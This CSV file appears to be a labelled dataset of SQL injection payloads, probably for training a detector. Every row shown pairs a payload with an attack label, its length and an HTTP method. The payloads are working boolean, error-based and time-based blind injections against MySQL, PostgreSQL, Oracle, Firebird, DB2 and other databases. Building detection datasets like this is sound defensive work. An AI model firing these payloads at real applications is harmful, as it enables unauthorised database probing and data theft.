sentence,attack_type,len_payload,http_method
"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and ""arqb"" like ""arqb",1,285,POST
"1"" and 4595 = 4595#",1,19,GET
"1"" and 4996 = 4431 and ""jzaq"" = ""jzaq",1,37,GET
"1"" and 5205 = 9975#",1,19,GET
"1"" and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ",1,108,POST
"1"" and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and ""epxq"" like ""epxq",1,131,POST
"1"" and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and ""xhvo"" = ""xhvo",1,128,GET
"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1,263,POST
"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""lgwe"" like ""lgwe",1,286,POST
"1"" and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""gxhz"" = ""gxhz",1,283,GET
"1"" and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ",1,105,GET
"1"" and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and ""sckh"" = ""sckh",1,125,GET
"1"" and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and ""tjbe"" like ""tjbe",1,128,POST
"1"" and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ",1,117,POST
"1"" and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and ""uvvy"" like ""uvvy",1,140,GET
"1"" and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and ""xwnw"" = ""xwnw",1,137,POST
"1"" and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ",1,162,POST
"1"" and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and ""hcjz"" like ""hcjz",1,185,GET
"1"" and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and ""wtkx"" = ""wtkx",1,182,GET
"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) ",1,98,GET
"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and ""icow"" like ""icow",1,121,POST
"1"" and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and ""kfps"" = ""kfps",1,118,POST
"1"" and 6637 = 2321",1,18,GET
"1"" and 6969 =  ( select 6969 from pg_sleep ( 5  )  )  ",1,52,POST
"1"" and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and ""ojpe"" like ""ojpe",1,76,POST
"1"" and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and ""twmy"" = ""twmy",1,73,GET
"1"" and 7533 = 7533",1,18,GET
"1"" and 7533 = 7533 and ""btak"" like ""btak",1,40,GET
"1"" and 7533 = 7533 and ""dqjp"" = ""dqjp",1,37,POST
"1"" and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""jgcv"" = ""jgcv",1,292,POST
"1"" and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and ""qqfd"" like ""qqfd",1,295,GET
"1"" and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) ",1,272,POST
"1"" and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,87,POST
"1"" and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,115,GET
"1"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,100,GET
"1"" and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  ",1,75,GET
"1"" and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""eslo"" like ""eslo",1,99,POST
"1"" and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""zwov"" = ""zwov",1,96,POST
"1"" and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ",1,105,GET
"1"" and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""ouix"" = ""ouix",1,125,POST
"1"" and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""rntg"" like ""rntg",1,128,POST
"1"" and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1,56,GET
"1"" and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,79,GET
"1"" and 9198 = 9198--",1,20,GET
"1"" and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,120,POST
"1"" and 9468 = 7105--",1,20,POST
"1"" and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,111,GET
"1"" and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,189,POST
"1"" and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 )  = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,144,POST
"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ",1,186,GET
"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and ""pmpk"" like ""pmpk",1,209,GET
"1"" and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and ""vukd"" = ""vukd",1,206,GET
"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ",1,143,POST
"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and ""cecf"" = ""cecf",1,163,POST
"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )  and ""wrbs"" like ""wrbs",1,166,GET
"1"" and elt ( 1210 = 1210,sleep ( 5  )  )  ",1,40,POST
"1"" and elt ( 1210 = 1210,sleep ( 5  )  )   and ""phcl"" like ""phcl",1,64,POST
"1"" and elt ( 1210 = 1210,sleep ( 5  )  )   and ""zhxm"" = ""zhxm",1,61,GET
"1"" and elt ( 2373 = 5817,5817 )  and ""rsdt"" = ""rsdt",1,51,GET
"1"" and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,43,GET
"1"" and elt ( 4249 = 4249,7259 ) ",1,31,POST
"1"" and elt ( 4249 = 4249,7259 )  and ""kgtz"" like ""kgtz",1,54,POST
"1"" and elt ( 4249 = 4249,7259 )  and ""tmxx"" = ""tmxx",1,51,GET
"1"" and elt ( 4594 = 1040,1040 ) ",1,31,POST
"1"" and elt ( 8464 = 5761,5761 )  and ""ydmt"" like ""ydmt",1,54,POST
"1"" and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1,139,GET
"1"" and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and ""oyuj"" = ""oyuj",1,160,GET
"1"" and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and ""qzzg"" like ""qzzg",1,163,GET
"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )  ",1,116,POST
"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and ""eiuc"" like ""eiuc",1,140,POST
"1"" and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   and ""okpa"" = ""okpa",1,137,GET
"1"" and make_set ( 4214 = 9503,9503 )  and ""phjg"" like ""phjg",1,59,POST
"1"" and make_set ( 6520 = 9958,9958 ) ",1,36,POST
"1"" and make_set ( 8262 = 3471,3471 )  and ""wayp"" = ""wayp",1,56,GET
"1"" and make_set ( 8403 = 8403,8899 ) ",1,36,GET
"1"" and make_set ( 8403 = 8403,8899 )  and ""bbgg"" = ""bbgg",1,56,GET
"1"" and make_set ( 8403 = 8403,8899 )  and ""fqxr"" like ""fqxr",1,59,POST
"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) ",1,249,POST
"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and ""nzgn"" = ""nzgn",1,269,GET
"1"" and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 6237 = 6237,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )  and ""mezx"" like ""mezx",1,272,POST
"1"" and sleep ( 5 ) ",1,18,POST
"1"" and sleep ( 5 )  and ""masm"" = ""masm",1,38,GET
"1"" and sleep ( 5 )  and ""tdid"" like ""tdid",1,41,GET
"1"" and sleep ( 5 ) #",1,20,GET
"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) ",1,117,POST
"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and ""egzm"" = ""egzm",1,137,POST
"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 )  and ""ygzq"" like ""ygzq",1,140,GET
"1"" or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #",1,63,POST
"1"" or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu ) ",1,61,POST
"1"" or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and ""pxix"" = ""pxix",1,81,GET
"1"" or  ( select * from  ( select ( sleep ( 5  )  )   ) ydpu )  and ""uvoq"" like ""uvoq",1,84,GET
"1"" or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) ",1,202,GET
"1"" or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and ""oyou"" = ""oyou",1,222,POST
"1"" or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and ""uqor"" like ""uqor",1,225,POST
"1"" or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a ) ",1,213,GET
"1"" or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and ""bkrk"" = ""bkrk",1,233,POST
"1"" or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and ""regi"" like ""regi",1,236,POST
"1"" or 1022 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,110,GET
"1"" or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,119,GET
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) ",1,97,GET
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and ""jbty"" like ""jbty",1,120,POST
"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )  and ""ljkg"" = ""ljkg",1,117,POST
"1"" or 4240 =  ( select 4240 from pg_sleep ( 5  )  )  --",1,55,GET
"1"" or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ",1,161,POST
"1"" or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and ""snht"" = ""snht",1,181,POST
"1"" or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and ""utzr"" like ""utzr",1,184,GET
"1"" or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,107,GET
"1"" or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ",1,107,GET
"1"" or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and ""jtgs"" like ""jtgs",1,130,POST
"1"" or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and ""uosc"" = ""uosc",1,127,POST
"1"" or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,164,GET
"1"" or 6793 =  ( select 6793 from pg_sleep ( 5  )  )  ",1,51,POST
"1"" or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and ""kojr"" = ""kojr",1,72,POST
"1"" or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   and ""pwwb"" like ""pwwb",1,75,GET
"1"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,86,GET
"1"" or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,114,GET
"1"" or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,100,POST
"1"" or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) ",1,116,POST
"1"" or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and ""kbex"" like ""kbex",1,139,GET
"1"" or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and ""zcfa"" = ""zcfa",1,136,POST
"1"" or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,78,POST
"1"" or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",1,111,GET
"1"" or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and ""kins"" = ""kins",1,131,GET
"1"" or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )  and ""xqgt"" like ""xqgt",1,134,GET
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  ",1,82,POST
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""bkoq"" = ""bkoq",1,103,POST
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and ""menm"" like ""menm",1,106,GET
"1"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  ",1,74,POST
"1"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""cdai"" = ""cdai",1,95,POST
"1"" or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""ncym"" like ""ncym",1,98,GET
"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  ",1,55,GET
"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and ""vnei"" like ""vnei",1,79,GET
"1"" or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and ""xbft"" = ""xbft",1,76,POST
"1"" or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1,58,POST
"1"" or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) ",1,104,GET
"1"" or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""ctdc"" = ""ctdc",1,124,POST
"1"" or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""vwep"" like ""vwep",1,127,POST
"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ",1,187,GET
"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and ""fvtu"" like ""fvtu",1,210,GET
"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  and ""zyoo"" = ""zyoo",1,207,GET
"1"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 )  = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",1,145,POST
"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ",1,139,POST
"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and ""bnyh"" = ""bnyh",1,159,GET
"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 )  = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )  and ""dtwv"" like ""dtwv",1,162,POST
"1"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,186,POST
"1"" or elt ( 5873 = 5873,sleep ( 5  )  )  #",1,42,GET
"1"" or elt ( 6272 = 6272,sleep ( 5  )  )  ",1,39,GET
"1"" or elt ( 6272 = 6272,sleep ( 5  )  )   and ""hvic"" like ""hvic",1,63,GET
"1"" or elt ( 6272 = 6272,sleep ( 5  )  )   and ""zzca"" = ""zzca",1,60,POST
"1"" or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1,138,POST
"1"" or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and ""deeu"" like ""deeu",1,162,GET
"1"" or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   and ""pnub"" = ""pnub",1,159,POST
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  ",1,115,POST
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and ""gknn"" like ""gknn",1,139,GET
"1"" or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and ""ymwb"" = ""ymwb",1,136,GET
"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) ",1,248,GET
"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and ""xmvr"" = ""xmvr",1,268,POST
"1"" or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and ""cgpm"" like ""cgpm",1,271,POST
"1"" or sleep ( 5 ) ",1,17,GET
"1"" or sleep ( 5 )  and ""fbuo"" like ""fbuo",1,40,POST
"1"" or sleep ( 5 )  and ""telb"" = ""telb",1,37,POST
"1"" or sleep ( 5 ) #",1,19,GET
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 ) ",1,116,GET
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and ""ekjs"" like ""ekjs",1,139,GET
"1"" or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 1808 = 1808,1  )  )   ) ,0x717a767a71 ) ,8666 )  and ""rdri"" = ""rdri",1,136,POST
"1"" order by 1--",1,15,POST
"1"" order by 1#",1,14,GET
"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 ) ",1,161,POST
"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and ""acbq"" like ""acbq",1,184,POST
"1"" procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and ""dsae"" = ""dsae",1,181,GET
"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 ) ",1,119,GET
"1"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50  )  )    )  )   ) ,1 )  and ""ikhr"" = ""ikhr",1,139,GET
